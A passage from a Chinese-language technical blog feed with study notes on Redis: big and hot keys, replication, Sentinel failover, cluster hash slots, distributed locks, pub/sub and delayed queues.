<h3 id="3-3-1-影响">3.3.1 影响</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>客户端超时阻塞</strong>。由于 Redis 执行命令是单线程处理，然后在操作大 key 时会比较耗时，那么就会阻塞 Redis，从客户端这一视角看，就是很久很久都没有响应。</p>
</li>
<li class="lvl-2">
<p><strong>引发网络阻塞</strong>。每次获取大 key 产生的网络流量较大，如果一个 key 的大小是 1 MB，每秒访问量为 1000，那么每秒会产生 1000MB 的流量，这对于普通千兆网卡的服务器来说是灾难性的。</p>
</li>
<li class="lvl-2">
<p><strong>阻塞工作线程</strong>。如果使用 del 删除大 key 时，会阻塞工作线程，这样就没办法处理后续的命令。</p>
</li>
<li class="lvl-2">
<p><strong>内存分布不均</strong>。集群模型在 slot 分片均匀情况下，会出现数据和查询倾斜情况，部分有大 key 的 Redis 节点占用内存多，QPS 也会比较大。</p>
</li>
</ul>
<h3 id="3-3-2-解决办法">3.3.2 解决办法</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>分批次删除</p>
</li>
<li class="lvl-2">
<p>异步删除（Redis 4.0版本以上）</p>
</li>
</ul>
<h2 id="3-4-Hotkey（–hotkeys）">3.4 Hotkey（–hotkeys）</h2>
<blockquote>
<p>一个key的访问次数比较多并且明显多于其他key<br>
hotkey 出现的原因主要是某个热点数据访问量暴增，如重大的热搜事件、参与秒杀的商品。</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>读写分离</strong>：主节点处理写请求，从节点处理读请求。</p>
</li>
<li class="lvl-2">
<p><strong>使用 Redis Cluster</strong>：将热点数据分散存储在多个 Redis 节点上。</p>
</li>
<li class="lvl-2">
<p><strong>二级缓存</strong>：hotkey 采用二级缓存的方式进行处理，将 hotkey 存放一份到 JVM 本地内存中（可以用 Caffeine）。</p>
</li>
</ul>
<h2 id="3-5-慢查询命令">3.5 慢查询命令</h2>
<blockquote>
<p>Redis 慢查询统计的是命令执行这一步骤的耗时，慢查询命令也就是那些命令执行时间较长的命令。</p>
</blockquote>
<ol>
<li class="lvl-3">
<p>发送命令</p>
</li>
<li class="lvl-3">
<p>命令排队</p>
</li>
<li class="lvl-3">
<p><strong>命令执行</strong></p>
</li>
<li class="lvl-3">
<p>返回结果</p>
</li>
</ol>
<p>在 <code>redis.conf</code> 文件中，我们可以使用 <code>slowlog-log-slower-than</code> 参数设置耗时命令的阈值，并使用 <code>slowlog-max-len</code> 参数设置耗时命令的最大记录条数。</p>
<p>当 Redis 服务器检测到执行时间超过 <code>slowlog-log-slower-than</code>阈值的命令时，就会将该命令记录在慢查询日志(slow log) 中，这点和 MySQL 记录慢查询语句类似。当慢查询日志超过设定的最大记录条数之后，Redis 会把最早的执行命令依次舍弃。</p>
<h1>4 多机数据库（集群，高可用）</h1>
<blockquote>
<p>要想设计一个高可用的 Redis 服务，一定要从 Redis 的多服务节点来考虑，比如 Redis 的主从复制、哨兵模式、切片集群。</p>
</blockquote>
<h2 id="4-1-主从复制">4.1 主从复制</h2>
<blockquote>
<p>主服务器可以进行读写操作，当发生写操作时自动将写操作同步给从服务器，而从服务器一般是只读，并接受主服务器同步过来写操作命令，然后执行这条命令。</p>
</blockquote>
<p>复制功能分为同步sync和命令传播(command propagate)两个操作</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>同步操作由从服务器请求，将数据库状态更新至主服务器数据库状态</p>
</li>
<li class="lvl-2">
<p>命令传播：</p>
</li>
</ul>
<h3 id="4-1-1-同步（全量复制）">4.1.1 同步（全量复制）</h3>
<ol>
<li class="lvl-3">
<p>从服务器向主服务器发送SYNC命令</p>
</li>
<li class="lvl-3">
<p>主服务器收到命令，执行BGSAVE命令，再后台生成RDB文件，并将之后执行的命令记录到缓冲区</p>
</li>
<li class="lvl-3">
<p>从服务器收到并载入RDB文件，将自己的数据库状态更新至主服务器执行BGSAVE 命令时的数据库状态</p>
</li>
<li class="lvl-3">
<p>主服务器将记录在缓冲区里面的所有写命令发送给从服务器，从服务器执行这些写命令</p>
</li>
</ol>
<h3 id="4-1-2-基于长连接的命令传播">4.1.2 基于长连接的命令传播</h3>
<p>写命令会造成服务器状态不一致，主服务器将执行的写命令发送给从服务器执行</p>
<p>旧版复制功能再主从服务器断联，并重新连接后，会再次执行SYNC命令，而不仅仅是将断联期间的命令传播给从服务器，要进行一次完整重同步。</p>
<p>PSYNC命令具有完整重同步( full resynchronization) 和部分重同步(partial resynchronization)两种模式：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>完整重同步用于初次复制</p>
</li>
<li class="lvl-2">
<p>部分重同步用于断线重连</p>
</li>
</ul>
<p>执行SYNC 命令需要生成、传送和载入整个RDB 文件， 而部分重同步只需要将从服务器缺少的写命令发送给从服务器执行就可以了。</p>
<h3 id="4-1-3-部分重同步（增量复制）">4.1.3 部分重同步（增量复制）</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>主服务器的复制偏移量和从服务器的复制偏移量</p>
</li>
<li class="lvl-3">
<p>主服务器的复制积压缓冲区(缓冲区会记录复制偏移量，从服务器断线重连，如果从缓冲区取得缺失命令，执行部分重同步，否则执行完整重同步)</p>
</li>
<li class="lvl-3">
<p>服务器运行ID（标识主服务器，从服务器重连后连接另一个主服务器，则执行完整重同步）</p>
</li>
<li class="lvl-2">
<p>当主服务器的写入速度远超于从服务器的读取速度，缓冲区的数据一下就会被覆盖。此时需要进行全量同步。增量复制就与<code> repl_backlog_size</code> 大小有关系，如果它配置的过小，主从服务器网络恢复时，可能发生「从服务器」想读的数据已经被覆盖了，那么这时就会导致主服务器采用全量复制的方式。所以为了避免这种情况的频繁发生，要调大这个参数的值，以降低主从服务器断开后全量同步的概率。</p>
</li>
</ul>
<h3 id="4-1-4-心跳检测">4.1.4 心跳检测</h3>
<blockquote>
<p>命令传播截断。从服务器向主服务器发送心跳</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>检测主从服务器的网络连接状态：主服务器可以知道主从连接是否正常</p>
</li>
<li class="lvl-2">
<p>辅助实现m i n-slaves 选项。</p>
</li>
<li class="lvl-2">
<p>检测命令丢失：主服务器命令传播丢失，通过心跳的偏移量可以检测到这一问题</p>
</li>
</ul>
<p>主服务器通过向从服务器<mark>传播命令</mark>来更新从服务器的状态，保持主从服务器一致，而从服务器则通过向主服务器发送命令来进行<mark>心跳检测</mark>，以及命令丢失检测。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Redis 主节点默认每隔 10 秒对从节点发送 ping 命令，判断从节点的存活性和连接状态，可通过参数repl-ping-slave-period控制发送频率。</p>
</li>
<li class="lvl-2">
<p>Redis 从节点每隔 1 秒发送 replconf ack{offset} 命令，给主节点上报自身当前的复制偏移量，目的是为了：</p>
<ul class="lvl-2">
<li class="lvl-6">实时监测主从节点网络状态；</li>
<li class="lvl-6">上报自身复制偏移量， 检查复制数据是否丢失， 如果从节点数据丢失， 再从主节点的复制缓冲区中拉取丢失数据。</li>
</ul>
</li>
</ul>
<h3 id="4-1-5-数据丢失">4.1.5 数据丢失</h3>
<h4 id="5-1-5-1-异步复制同步丢失">5.1.5.1 异步复制同步丢失</h4>
<p>主节点将写请求同步给从节点时宕机</p>
<p>Redis 配置里有一个参数 min-slaves-max-lag，表示一旦所有的从节点数据复制和同步的延迟都超过了 min-slaves-max-lag 定义的值，那么主节点就会拒绝接收任何请求。</p>
<p>那么对于客户端，当客户端发现 master 不可写后，我们可以采取降级措施，将数据暂时写入本地缓存和磁盘中，在一段时间（等 master 恢复正常）后重新写入 master 来保证数据不丢失，也可以将数据写入 kafka 消息队列，等 master 恢复正常，再隔一段时间去消费 kafka 中的数据，让将数据重新写入 master 。</p>
<h4 id="5-1-5-2-集群产生脑裂数据丢失">5.1.5.2 集群产生脑裂数据丢失</h4>
<p>由于网络问题，集群节点之间失去联系。主从数据不同步；重新平衡选举，产生两个主服务。等网络恢复，旧主节点会降级为从节点，再与新主节点进行同步复制的时候，由于会从节点会清空自己的缓冲区，所以导致之前客户端写入的数据丢失了。</p>
<h3 id="4-1-6-主从故障切换">4.1.6 主从故障切换</h3>
<p>Redis 哨兵机制就登场了，哨兵在发现主节点出现故障时，由哨兵自动完成故障发现和故障转移，并通知给应用方，从而实现高可用性。</p>
<h2 id="4-2-哨兵模式-Sentinel，高可用">4.2 哨兵模式(Sentinel，高可用)</h2>
<p><mark>选主、故障转移、通知</mark></p>
<blockquote>
<p>实现<strong>主从节点故障转移</strong>。它会监测主节点是否存活，如果发现主节点挂了，它就会选举一个从节点切换为主节点，并且把新主节点的相关信息通知给从节点和客户端。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405102157934.png" alt="image.png"></p>
<h3 id="4-2-1-判断主节点故障">4.2.1 判断主节点故障</h3>
<p>哨兵会每隔 1 秒给所有主从节点发送 PING 命令，当主从节点收到 PING 命令后，会发送一个响应命令给哨兵，这样就可以判断它们是否在正常运行。</p>
<p>如果主节点或者从节点没有在规定的时间内响应哨兵的 PING 命令，哨兵就会将它们标记为「<strong>主观下线</strong>」。这个「规定的时间」是配置项 <code>down-after-milliseconds</code> 参数设定的，单位是毫秒。</p>
<p>哨兵部署多个节点，构成<strong>哨兵集群</strong>，降低误判概率。当一个哨兵判断主节点为「主观下线」后，就会向其他哨兵发起命令，其他哨兵收到这个命令后，就会根据自身和主节点的网络状况，做出赞成投票或者拒绝投票的响应。当超过半数的哨兵判断主节点<strong>主观下线</strong>后，则主节点<strong>客观下线</strong>。</p>
<h3 id="4-2-2-选举领头Sentinel">4.2.2 选举领头Sentinel</h3>
<blockquote>
<p>当一个主服务器被判断为客观下线时，监视这个下线主服务器的各个Sentinel 会进行协商，选举出一个领头Sentinel , 并由领头Sen tinel 对下线主服务器执行故障转移操作。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403222019815.png" alt="image.png"></p>
<h3 id="4-2-3-故障转移">4.2.3 故障转移</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>在已下线主服务器属下的所有从服务器里面，挑选出一个从服务器，并将其转换为主服务器。</p>
</li>
<li class="lvl-2">
<p>让已下线主服务器属下的所有从服务器改为复制新的主服务器。</p>
</li>
<li class="lvl-2">
<p>将已下线主服务器设置为新的主服务器的从服务器，当这个旧的主服务器重新上线时，它就会成为新的主服务器的从服务器。</p>
</li>
</ul>
<ol>
<li class="lvl-3">
<p>选出新主节点</p>
</li>
<li class="lvl-3">
<p>将从节点指向新主节点</p>
</li>
<li class="lvl-3">
<p>通过Redis的发布者/订阅者机制通知客户的主节点已更换</p>
</li>
<li class="lvl-3">
<p>将旧主节点变为从节点</p>
</li>
</ol>
<h2 id="4-3-切片集群">4.3 切片集群</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403222036276.png" alt="image.png|475"></p>
<blockquote>
<p>clusterState.slots数组记录了集群中所有槽的指派信息，而clusterNode.slots数组只记录了clusterNode结构所代表的节点的槽指派信息，这是两个slots数组的关键区别所在。</p>
</blockquote>
<p>当 Redis 缓存数据量大到一台服务器无法缓存时，就需要使用 <strong>Redis 切片集群</strong>（Redis Cluster ）方案，它将数据分布在不同的服务器上，以此来降低系统对单主节点的依赖，从而提高 Redis 服务的读写性能。</p>
<p>Redis Cluster 方案采用哈希槽（Hash Slot），来处理数据和节点之间的映射关系。在 Redis Cluster 方案中，<strong>一个切片集群共有 16384 个哈希槽</strong>，这些哈希槽类似于数据分区，每个键值对都会根据它的 key，被映射到一个哈希槽中，具体执行过程分为两大步：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>根据键值对的 key，按照 <a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check">CRC16 算法 (opens new window)</a>计算一个 16 bit 的值。</p>
</li>
<li class="lvl-2">
<p>再用 16bit 值对 16384 取模，得到 0~16383 范围内的模数，每个模数代表一个相应编号的哈希槽。</p>
</li>
</ul>
<p>接下来的问题就是，这些哈希槽怎么被映射到具体的 Redis 节点上的呢？有两种方案：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>平均分配：</strong> 在使用 cluster create 命令创建 Redis 集群时，Redis 会自动把所有哈希槽平均分布到集群节点上。比如集群中有 9 个节点，则每个节点上槽的个数为 16384/9 个。</p>
</li>
<li class="lvl-2">
<p><strong>手动分配：</strong> 可以使用 cluster meet 命令手动建立节点间的连接，组成集群，再使用 cluster addslots 命令，指定每个节点上的哈希槽个数。</p>
</li>
</ul>
<p>$$<br>
\begin{aligned}<br>
\frac{16384}{8}=2048B=2KB\<br>
2^{16}=65536=16384\times 4<br>
\end{aligned}<br>
$$</p>
<p>Redis Cluster没有使用<mark>一致性哈希</mark>，采用的是哈希槽分区，每一个键值对都属于一个 <strong>hash slot</strong>（哈希槽） 。当客户端发送命令请求的时候，需要先根据 key 通过上面的计算公示找到的对应的哈希槽，然后再查询哈希槽和节点的映射关系，即可找到目标 Redis 节点。</p>
<h1>5 参考</h1>
<p><a href="https://xiaolincoding.com/redis/cluster/master_slave_replication.html">主从复制是怎么实现的？ | 小林coding (xiaolincoding.com)</a><br>
<a href="https://xiaolincoding.com/redis/cluster/sentinel.html#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E6%9C%89%E5%93%A8%E5%85%B5%E6%9C%BA%E5%88%B6">为什么要有哨兵？ | 小林coding (xiaolincoding.com)</a><br>
<a href="https://www.cnblogs.com/rjzheng/p/11430592.html">【原创】为什么Redis集群有16384个槽 - 孤独烟 - 博客园 (cnblogs.com)</a><br>
<a href="https://mp.weixin.qq.com/s/PR3Gy8GbfQhi-mabmM_gVA">美团二面:说说redis主从的脑裂行为 (qq.com)</a></p>
<p><strong>Redis Sentinel</strong>：</p>
<ol>
<li class="lvl-3">
<p>什么是 Sentinel？ 有什么用？</p>
</li>
<li class="lvl-3">
<p>Sentinel 如何检测节点是否下线？主观下线与客观下线的区别?</p>
</li>
<li class="lvl-3">
<p>Sentinel 是如何实现故障转移的？</p>
</li>
<li class="lvl-3">
<p>为什么建议部署多个 sentinel 节点（哨兵集群）？</p>
</li>
<li class="lvl-3">
<p>Sentinel 如何选择出新的 master（选举机制）?</p>
</li>
<li class="lvl-3">
<p>如何从 Sentinel 集群中选择出 Leader ？</p>
</li>
<li class="lvl-3">
<p>Sentinel 可以防止脑裂吗？</p>
</li>
</ol>
<p><strong>Redis Cluster</strong>：</p>
<ol>
<li class="lvl-3">
<p>为什么需要 Redis Cluster？解决了什么问题？有什么优势？</p>
</li>
<li class="lvl-3">
<p>Redis Cluster 是如何分片的？</p>
</li>
<li class="lvl-3">
<p>为什么 Redis Cluster 的哈希槽是 16384 个?</p>
</li>
<li class="lvl-3">
<p>如何确定给定 key 的应该分布到哪个哈希槽中？</p>
</li>
<li class="lvl-3">
<p>Redis Cluster 支持重新分配哈希槽吗？</p>
</li>
<li class="lvl-3">
<p>Redis Cluster 扩容缩容期间可以提供服务吗？</p>
</li>
<li class="lvl-3">
<p>Redis Cluster 中的节点是怎么进行通信的？</p>
</li>
</ol>
<p><a href="https://javaguide.cn/database/redis/redis-questions-02.html#redis-%E9%9B%86%E7%BE%A4">Redis常见面试题总结(下) | JavaGuide</a></p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis(3)：应用</title>
    <url>/2024/03/24/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis(3)%EF%BC%9A%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<ul class="lvl-0">
<li class="lvl-2">
<p><strong>分布式锁</strong>：通过 Redis 来做分布式锁是一种比较常见的方式。通常情况下，我们都是基于 Redisson 来实现分布式锁。</p>
</li>
<li class="lvl-2">
<p><strong>限流</strong>：一般是通过 Redis + Lua 脚本的方式来实现限流。</p>
</li>
<li class="lvl-2">
<p><strong>消息队列</strong>：Redis 自带的 List 数据结构可以作为一个简单的队列使用。Redis 5.0 中增加的 Stream 类型的数据结构更加适合用来做消息队列。它比较类似于 Kafka，有主题和消费组的概念，支持消息持久化以及 ACK 机制。</p>
</li>
<li class="lvl-2">
<p><strong>延时队列</strong>：Redisson 内置了延时队列（基于 Sorted Set 实现的）。</p>
</li>
<li class="lvl-2">
<p><strong>分布式 Session</strong> ：利用 String 或者 Hash 数据类型保存 Session 数据，所有的服务器都可以访问。</p>
</li>
<li class="lvl-2">
<p><strong>复杂业务场景</strong>：通过 Redis 以及 Redis 扩展（比如 Redisson）提供的数据结构，我们可以很方便地完成很多复杂的业务场景比如通过 Bitmap 统计活跃用户、通过 Sorted Set 维护排行榜。</p>
</li>
</ul>
<h1>1 分布式锁</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>锁是否可重入（唯一标识）</p>
</li>
<li class="lvl-2">
<p>锁失效机制（过期时间，看门狗续期）</p>
</li>
<li class="lvl-2">
<p>未释放锁</p>
</li>
<li class="lvl-2">
<p>获取锁后未同步到从服务器（红锁）</p>
</li>
</ul>
<h2 id="1-1-分布式锁实现">1.1 分布式锁实现</h2>
<h3 id="1-1-1-基于数据库的实现方式">1.1.1 基于数据库的实现方式</h3>
<p>基于数据库的实现方式的核心思想是：在数据库中创建一个表，表中包含<strong>方法名</strong>等字段，并在<strong>方法名字段上创建唯一索引</strong>，想要执行某个方法，就使用这个方法名向表中插入数据，成功插入则获取锁，执行完成后删除对应的行数据释放锁。</p>
<p>使用基于数据库的这种实现方式很简单，但是对于分布式锁应该具备的条件来说，它有一些问题需要解决及优化：</p>
<p>1、因为是基于数据库实现的，数据库的可用性和性能将直接影响分布式锁的可用性及性能，所以，数据库需要双机部署、数据同步、主备切换；</p>
<p>2、<strong>不具备可重入的特性</strong>，因为同一个线程在释放锁之前，行数据一直存在，无法再次成功插入数据，所以，需要在表中新增一列，用于记录当前获取到锁的机器和线程信息，在再次获取锁的时候，先查询表中机器和线程信息是否和当前机器和线程相同，若相同则直接获取锁；</p>
<p>3、<strong>没有锁失效机制</strong>，因为有可能出现成功插入数据后，服务器宕机了，对应的数据没有被删除，当服务恢复后一直获取不到锁，所以，需要在表中新增一列，用于记录失效时间，并且需要有定时任务清除这些失效的数据；</p>
<p>4、不具备阻塞锁特性，获取不到锁直接返回失败，所以需要优化获取逻辑，循环多次去获取。</p>
<h3 id="1-1-2-基于Redis的实现方式">1.1.2 基于Redis的实现方式</h3>
<p><code>SETNX</code> 是 Redis 中的一个命令，用于设置键的值，但仅当键不存在时才设置成功。在分布式环境中，可以利用 <code>SETNX</code> 命令来实现分布式锁。具体步骤如下：</p>
<ol>
<li class="lvl-3">
<p>客户端通过 <code>SETNX</code> 命令尝试将一个特定的键作为锁的标识，并设置一个唯一的值作为锁的持有者标识。</p>
</li>
<li class="lvl-3">
<p>如果 <code>SETNX</code> 命令成功执行（返回值为 1），表示当前客户端成功获取了锁，可以执行后续操作。</p>
</li>
<li class="lvl-3">
<p>如果 <code>SETNX</code> 命令执行失败（返回值为 0），表示当前锁已被其他客户端持有，当前客户端未获取到锁，需要等待一段时间后重新尝试获取锁。</p>
</li>
</ol>
<p>虽然 <code>SETNX</code> 命令在某些情况下可以用来实现简单的分布式锁，但是它也存在一些问题：</p>
<ol>
<li class="lvl-3">
<p><strong>无法设置过期时间</strong>：<code>SETNX</code> 命令本身不支持设置键的过期时间，因此当持有锁的客户端发生异常或程序出现问题时，可能导致锁无法被释放，造成死锁或锁泄露问题。</p>
</li>
<li class="lvl-3">
<p><strong>非原子性操作</strong>：尽管 <code>SETNX</code> 命令本身是原子性的，但是获取锁和释放锁通常需要多个命令的组合，例如获取锁时需要执行 <code>SETNX</code>，释放锁时需要执行 <code>DEL</code>。这种组合操作不是原子性的，可能会导致锁的不一致性问题。</p>
</li>
<li class="lvl-3">
<p>Redis集群，设置锁到主节点，主节点同步锁时挂掉</p>
</li>
</ol>
<p>为了解决这些问题，可以采用以下方法：</p>
<ol>
<li class="lvl-3">
<p><strong>配合 <code>EXPIRE</code> 命令设置过期时间</strong>：在获取锁成功后，使用 <code>EXPIRE</code> 命令为锁设置一个合理的过期时间，确保即使持有锁的客户端发生异常，锁也能在一定时间后自动释放。</p>
</li>
<li class="lvl-3">
<p><strong>使用 Lua 脚本确保原子性</strong>：将获取锁和释放锁的操作封装在 Lua 脚本中执行，Lua 脚本可以在 Redis 中以原子性的方式执行多个命令，确保获取锁和释放锁的操作是原子性的，避免了竞态条件的发生。</p>
</li>
<li class="lvl-3">
<p>考虑使用<strong>Redlock红锁</strong>算法等更复杂的分布式锁方案：如果应用场景要求更高的分布式锁安全性和可靠性，可以考虑使用 Redlock 算法等更复杂的分布式锁方案，这些方案通常基于多个 Redis 实例，并结合超时机制和复制机制来保证分布式锁的安全性和可靠性。</p>
</li>
</ol>
<h3 id="1-1-3-基于ZooKeeper的实现方式（临时有序节点）">1.1.3 基于ZooKeeper的实现方式（临时有序节点）</h3>
<blockquote>
<p>[!note]<br>
每个客户端对某个方法加锁时，在zookeeper上的 与该方法对应的指定节点的目录下，生成一个唯一的瞬时有序节点。 判断是否获取锁的方式很简单，只需要判断有 序节点中序号最小的一个。 当释放锁的时候，只需将这个瞬时节点删除即可。同时，其可以避免服务宕机导致的锁 无法释放，而产生的死锁问题。完成业务流程后，删除对应的子节点释放锁。</p>
</blockquote>
<p>ZooKeeper是一个为分布式应用提供一致性服务的开源组件，它内部是一个分层的文件系统目录树结构，规定同一个目录下只能有一个唯一文件名。基于ZooKeeper实现分布式锁的步骤如下：</p>
<p>（1）创建一个目录mylock；<br>
（2）线程A想获取锁就<mark>在mylock目录下创建临时顺序节点</mark>；<br>
（3）获取mylock目录下所有的子节点，然后获取比自己小的兄弟节点，如果不存在，则说明当前线程顺序号最小，获得锁；<br>
（4）线程B获取所有节点，判断自己不是最小节点，设置监听比自己次小的节点；<br>
（5）线程A处理完，删除自己的节点，线程B监听到变更事件，判断自己是不是最小的节点，如果是则获得锁。</p>
<p>优点：具备高可用、可重入、阻塞锁特性，可解决失效死锁问题。</p>
<p>缺点：因为需要频繁的创建和删除节点，性能上不如Redis方式。</p>
<h3 id="1-1-4-Redisson实现分布式锁">1.1.4 Redisson实现分布式锁</h3>
<p>业务处理时间&gt;锁自动释放时间看门狗续期：延迟任务</p>
<h2 id="1-2-分布式锁挂掉（无法获取锁）">1.2 分布式锁挂掉（无法获取锁）</h2>
<ol>
<li class="lvl-3">
<p><mark>检查Redis服务器状态</mark>：首先需要确保Redis服务器正常工作。可以尝试通过telnet命令连接Redis服务器，并使用PING命令检查连接是否正常。如果无法连接或者连接异常，可以尝试重启Redis服务器来恢复正常工作。</p>
</li>
<li class="lvl-3">
<p>检查网络连接：如果Redis服务器正常工作，但是无法获取到锁，可能是网络连接存在问题。可以检查网络连接是否正常，包括网络延迟、带宽等。可以使用ping命令或者traceroute命令来检查网络连接是否正常。</p>
</li>
<li class="lvl-3">
<p>重启Redis：如果发现Redis分布式锁挂了，我们可以尝试重启Redis服务来解决问题。在重启之前，需要先确保已备份好重要的数据，并通知系统管理员进行操作。</p>
</li>
<li class="lvl-3">
<p><mark>采用备份机制</mark>：在分布式系统中，可以考虑使用主从复制或者集群模式来提供高可用性和容错能力。当主节点出现故障时，从节点可以接管工作，避免分布式锁挂掉导致系统不可用。</p>
</li>
<li class="lvl-3">
<p><mark>重试机制</mark>：在获取分布式锁时，可以设置重试机制，即当无法获取到锁时，进行一定次数的重试。这样可以增加获取到锁的机会。可以设置一个重试次数和重试间隔，当达到重试次数后，可以进行其他的处理逻辑。</p>
</li>
<li class="lvl-3">
<p>监控和告警：为了及时发现Redis分布式锁挂了的情况，可以设置监控和告警机制。可以监控Redis服务器的状态，包括连接数、内存使用情况等，并设置告警规则，在异常情况下及时通知管理员。</p>
</li>
<li class="lvl-3">
<p>锁失效机制</p>
</li>
</ol>
<h2 id="1-3-存在问题">1.3 存在问题</h2>
<p><strong>持有锁未释放导致死锁</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>锁过期时间<br>
<strong>锁提前过期</strong></p>
</li>
<li class="lvl-2">
<p>守护进程，自动续期<br>
<strong>释放其他机器申请的锁</strong></p>
</li>
<li class="lvl-2">
<p>加上唯一标识</p>
</li>
</ul>
<p><strong>主从切换，从库未同步主库的锁</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Redlock，红锁，在多个Redis实例上加锁</p>
</li>
</ul>
<p><a href="https://xiaolincoding.com/redis/base/redis_interview.html#%E5%A6%82%E4%BD%95%E7%94%A8-redis-%E5%AE%9E%E7%8E%B0%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E7%9A%84">Redis 常见面试题 | 小林coding (xiaolincoding.com)</a></p>
<p><a href="https://www.cnblogs.com/liuqingzheng/p/11080501.html">什么是分布式锁？实现分布式锁的三种方式 - 刘清政 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/qq_40873718/article/details/105888915">Java分布式锁（6种实现方法）_分布式锁 实现方案-CSDN博客</a></p>
<p><a href="https://www.zhihu.com/question/300767410/answer/1931519430">怎样实现redis分布式锁？ - 知乎 (zhihu.com)</a></p>
<h1>2 消息队列</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>List</p>
</li>
<li class="lvl-2">
<p>Stream：发布/订阅</p>
</li>
</ul>
<h2 id="2-1-Pub-sub">2.1 Pub/sub</h2>
<p>发布订阅机制存在以下缺点，都是跟丢失数据有关：</p>
<ol>
<li class="lvl-3">
<p>发布/订阅机制没有基于任何数据类型实现，所以不具备「数据持久化」的能力，也就是发布/订阅机制的相关操作，不会写入到 RDB 和 AOF 中，当 Redis 宕机重启，发布/订阅机制的数据也会全部丢失。</p>
</li>
<li class="lvl-3">
<p>发布订阅模式是“发后既忘”的工作模式，如果有订阅者离线重连之后不能消费之前的历史消息。</p>
</li>
<li class="lvl-3">
<p>当消费端有一定的消息积压时，也就是生产者发送的消息，消费者消费不过来时，如果超过 32M 或者是 60s 内持续保持在 8M 以上，消费端会被强行断开，这个参数是在配置文件中设置的，默认值是 <code>client-output-buffer-limit pubsub 32mb 8mb 60</code>。</p>
</li>
<li class="lvl-3">
<p>丢消息</p>
</li>
</ol>
<p>所以，发布/订阅机制只适合即时通讯的场景，比如<a href="https://xiaolincoding.com/redis/cluster/sentinel.html#%E5%93%A8%E5%85%B5%E9%9B%86%E7%BE%A4%E6%98%AF%E5%A6%82%E4%BD%95%E7%BB%84%E6%88%90%E7%9A%84">构建哨兵集群 (opens new window)</a>的场景采用了发布/订阅机制。</p>
<p><a href="https://zhuanlan.zhihu.com/p/344269737">Redis 消息队列的三种方案（List、Streams、Pub/Sub） - 知乎 (zhihu.com)</a></p>
<h1>3 搜索引擎</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>RediSearch：基于 Redis 的搜索引擎模块</p>
</li>
</ul>
<h2 id="3-1-RediSearch-vs-Elasticsearch">3.1   RediSearch vs Elasticsearch</h2>
<h1>4 延时任务(延迟队列)</h1>
<blockquote>
<p>场景：订单超时取消、红包超时退回</p>
</blockquote>
<ol>
<li class="lvl-3">
<p>Redis 过期事件监听</p>
</li>
<li class="lvl-3">
<p>Redisson 内置的延时队列</p>
</li>
</ol>
<p>延迟队列是指把当前要做的事情，往后推迟一段时间再做。延迟队列的常见使用场景有以下几种：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>在淘宝、京东等购物平台上下单，超过一定时间未付款，订单会自动取消；</p>
</li>
<li class="lvl-2">
<p>打车的时候，在规定时间没有车主接单，平台会取消你的单并提醒你暂时没有车主接单；</p>
</li>
<li class="lvl-2">
<p>点外卖的时候，如果商家在10分钟还没接单，就会自动取消订单；</p>
</li>
</ul>
<p>在 Redis 可以使用有序集合（ZSet）的方式来实现延迟消息队列的，ZSet 有一个 Score 属性可以用来存储延迟执行的时间。</p>
<p>使用 zadd score1 value1 命令就可以一直往内存中生产消息。再利用 zrangebysocre 查询符合条件的所有待处理的任务， 通过循环执行队列任务即可。</p>
<h2 id="4-1-Redis过期事件监听">4.1 Redis过期事件监听</h2>
<p>Redis 2.0 引入了发布订阅 (pub/sub) 功能。在 pub/sub 中，引入了一个叫做 <strong>channel（频道）</strong> 的概念，有点类似于消息队列中的 <strong>topic（主题）</strong>。</p>
<p>pub/sub 涉及发布者（publisher）和订阅者（subscriber，也叫消费者）两个角色：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>发布者通过 <code>PUBLISH</code> 投递消息给指定 channel。</p>
</li>
<li class="lvl-2">
<p>订阅者通过<code>SUBSCRIBE</code>订阅它关心的 channel。并且，订阅者可以订阅一个或者多个 channel。</p>
</li>
</ul>
<p>在 pub/sub 模式下，生产者需要指定消息发送到哪个 channel 中，而消费者则订阅对应的 channel 以获取消息。</p>
<p>Redis 中有很多默认的 channel，这些 channel 是由 Redis 本身向它们发送消息的，而不是我们自己编写的代码。其中，<code>__keyevent@0__:expired</code> 就是一个默认的 channel，负责<strong>监听 key 的过期事件</strong>。也就是说，当一个 key 过期之后，Redis 会发布一个 key 过期的事件到<code>__keyevent@&lt;db&gt;__:expired</code>这个 channel 中。</p>
<p>我们只需要监听这个 channel，就可以拿到过期的 key 的消息，进而实现了延时任务功能。</p>
<ol>
<li class="lvl-3">
<p>时效性差：过期事件消息是在 Redis 服务器删除 key 时发布的，而不是一个 key 过期之后就会就会直接发布。</p>
</li>
<li class="lvl-3">
<p>丢消息：Redis 的 pub/sub 模式中的消息并不支持持久化，这与消息队列不同。在 Redis 的 pub/sub 模式中，发布者将消息发送给指定的频道，订阅者监听相应的频道以接收消息。当没有订阅者时，消息会被直接丢弃，在 Redis 中不会存储该消息。</p>
</li>
<li class="lvl-3">
